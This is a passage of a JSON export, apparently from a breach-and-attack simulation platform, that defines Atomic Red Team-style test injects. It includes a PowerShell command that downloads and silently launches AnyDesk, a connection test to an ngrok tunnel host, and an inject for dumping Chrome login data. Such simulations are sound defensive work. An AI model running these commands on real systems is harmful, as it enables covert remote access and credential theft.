          "attack_pattern_id" : "75970443-e3c5-4714-8554-d11cada1abea",
          "attack_pattern_name" : "Remote Access Tools",
          "attack_pattern_description" : "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
          "attack_pattern_external_id" : "T1219",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "a9e1666d-f870-498c-a22f-7779aa9e50a1",
            "phase_external_id" : "TA0011",
            "phase_stix_id" : "x-mitre-tactic--f72804c5-f15a-449e-a5da-2eecd181f813",
            "phase_name" : "Command and Control",
            "phase_shortname" : "command-and-control",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "phase_order" : 11
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:21.512510Z",
        "payload_updated_at" : "2025-07-03T14:48:42.420293Z",
        "command_executor" : "psh",
        "command_content" : "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:21.525701Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:21.525701Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "75970443-e3c5-4714-8554-d11cada1abea",
        "attack_pattern_name" : "Remote Access Tools",
        "attack_pattern_description" : "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
        "attack_pattern_external_id" : "T1219",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "a9e1666d-f870-498c-a22f-7779aa9e50a1",
          "phase_external_id" : "TA0011",
          "phase_stix_id" : "x-mitre-tactic--f72804c5-f15a-449e-a5da-2eecd181f813",
          "phase_name" : "Command and Control",
          "phase_shortname" : "command-and-control",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
          "phase_order" : 11
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "e40ffcd6-bf33-4913-9c3a-9ca1d21f0066",
    "inject_title" : "ngrok Proxy Service",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1500,
    "inject_injector_contract" : {
      "convertedContent" : {
        "label" : {
          "en" : "ngrok Proxy Service",
          "fr" : "ngrok Proxy Service"
        },
        "config" : {
          "type" : "openbas_implant",
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "expose" : true,
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "fields" : [ {
          "key" : "assets",
          "type" : "asset",
          "label" : "Assets",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "assetgroups",
          "type" : "asset-group",
          "label" : "Asset groups",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "expectations",
          "type" : "expectation",
          "label" : "Expectations",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null,
          "predefinedExpectations" : [ {
            "expectation_name" : "Expect inject to be prevented",
            "expectation_type" : "PREVENTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_name" : "Expect inject to be detected",
            "expectation_type" : "DETECTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ]
        }, {
          "key" : "obfuscator",
          "type" : "choice",
          "label" : "Obfuscator",
          "choices" : [ {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          }, {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          } ],
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null
        } ],
        "manual" : false,
        "context" : { },
        "platforms" : [ "Windows" ],
        "variables" : [ {
          "key" : "user",
          "type" : "String",
          "label" : "User that will receive the injection",
          "children" : [ {
            "key" : "user.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.email",
            "type" : "String",
            "label" : "Email of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.firstname",
            "type" : "String",
            "label" : "First name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lastname",
            "type" : "String",
            "label" : "Last name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lang",
            "type" : "String",
            "label" : "Language of the user",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "exercise",
          "type" : "Object",
          "label" : "Exercise of the current injection",
          "children" : [ {
            "key" : "exercise.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.name",
            "type" : "String",
            "label" : "Name of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.description",
            "type" : "String",
            "label" : "Description of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "teams",
          "type" : "String",
          "label" : "List of team name for the injection",
          "children" : [ ],
          "cardinality" : "n"
        }, {
          "key" : "player_uri",
          "type" : "String",
          "label" : "Player interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "challenges_uri",
          "type" : "String",
          "label" : "Challenges interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "scoreboard_uri",
          "type" : "String",
          "label" : "Scoreboard interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "lessons_uri",
          "type" : "String",
          "label" : "Lessons learned interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        } ],
        "contract_id" : "42ba93cb-cdf3-4785-aebf-7305f0b861d1",
        "needs_executor" : true,
        "is_atomic_testing" : true,
        "contract_attack_patterns_external_ids" : [ ]
      },
      "listened" : true,
      "injector_contract_id" : "42ba93cb-cdf3-4785-aebf-7305f0b861d1",
      "injector_contract_labels" : {
        "en" : "ngrok Proxy Service",
        "fr" : "ngrok Proxy Service"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"label\":{\"en\":\"ngrok Proxy Service\",\"fr\":\"ngrok Proxy Service\"},\"config\":{\"type\":\"openbas_implant\",\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"expose\":true,\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"fields\":[{\"key\":\"assets\",\"type\":\"asset\",\"label\":\"Assets\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"assetgroups\",\"type\":\"asset-group\",\"label\":\"Asset groups\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"expectations\",\"type\":\"expectation\",\"label\":\"Expectations\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null,\"predefinedExpectations\":[{\"expectation_name\":\"Expect inject to be prevented\",\"expectation_type\":\"PREVENTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_name\":\"Expect inject to be detected\",\"expectation_type\":\"DETECTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}]},{\"key\":\"obfuscator\",\"type\":\"choice\",\"label\":\"Obfuscator\",\"choices\":[{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"},{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"}],\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null}],\"manual\":false,\"context\":{},\"platforms\":[\"Windows\"],\"variables\":[{\"key\":\"user\",\"type\":\"String\",\"label\":\"User that will receive the injection\",\"children\":[{\"key\":\"user.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.email\",\"type\":\"String\",\"label\":\"Email of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.firstname\",\"type\":\"String\",\"label\":\"First name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lastname\",\"type\":\"String\",\"label\":\"Last name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lang\",\"type\":\"String\",\"label\":\"Language of the user\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"exercise\",\"type\":\"Object\",\"label\":\"Exercise of the current injection\",\"children\":[{\"key\":\"exercise.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.name\",\"type\":\"String\",\"label\":\"Name of the exercise\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.description\",\"type\":\"String\",\"label\":\"Description of the exercise\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"teams\",\"type\":\"String\",\"label\":\"List of team name for the injection\",\"children\":[],\"cardinality\":\"n\"},{\"key\":\"player_uri\",\"type\":\"String\",\"label\":\"Player interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"challenges_uri\",\"type\":\"String\",\"label\":\"Challenges interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"scoreboard_uri\",\"type\":\"String\",\"label\":\"Scoreboard interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"lessons_uri\",\"type\":\"String\",\"label\":\"Lessons learned interface platform link\",\"children\":[],\"cardinality\":\"1\"}],\"contract_id\":\"42ba93cb-cdf3-4785-aebf-7305f0b861d1\",\"needs_executor\":true,\"is_atomic_testing\":true,\"contract_attack_patterns_external_ids\":[]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "b67575d7-8e0f-42df-a494-61638326f23e",
        "payload_type" : "Command",
        "payload_name" : "ngrok Proxy Service",
        "payload_description" : "",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : null,
        "payload_source" : "MANUAL",
        "payload_status" : "VERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : null,
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-16T13:30:00.722048Z",
        "payload_updated_at" : "2024-12-16T13:30:00.722048Z",
        "command_executor" : "psh",
        "command_content" : "echo \"# Test #26 - T1090 - ngrok Proxy Service\"\nping -n 1 tunnel.ngrok.com\ntnc tunnel.ngrok.com -port 443",
        "payload_collector_type" : null
      },
      "injector_contract_created_at" : "2024-12-16T13:30:00.734431Z",
      "injector_contract_updated_at" : "2024-12-16T13:30:00.734431Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "c2c65511-25f3-446e-ace2-0c050b3e76ec",
    "inject_title" : "Dump Chrome Login Data with esentutl",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "output_path" : "%temp%\\T1555.003_Login_Data.tmp",
      "PathToAtomicsFolder\\__\\ExternalPayloads_path" : "./ExternalPayloads/../ExternalPayloads",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_path" : "./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 660,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Dump Chrome Login Data with esentutl",
          "fr" : "Dump Chrome Login Data with esentutl"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "output_path",
          "label" : "output_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%temp%\\T1555.003_Login_Data.tmp",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "c8b13612-08be-40a7-95f4-e72e531dd51e",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "c8b13612-08be-40a7-95f4-e72e531dd51e",
      "injector_contract_labels" : {
        "en" : "Dump Chrome Login Data with esentutl",
        "fr" : "Dump Chrome Login Data with esentutl"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Dump Chrome Login Data with esentutl\",\"fr\":\"Dump Chrome Login Data with esentutl\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"output_path\",\"label\":\"output_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%temp%\\\\T1555.003_Login_Data.tmp\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\ChromeStandaloneSetup64_msi_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\ChromeStandaloneSetup64_msi_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\ChromeStandaloneSetup64_msi_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\ChromeStandaloneSetup64_msi_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the 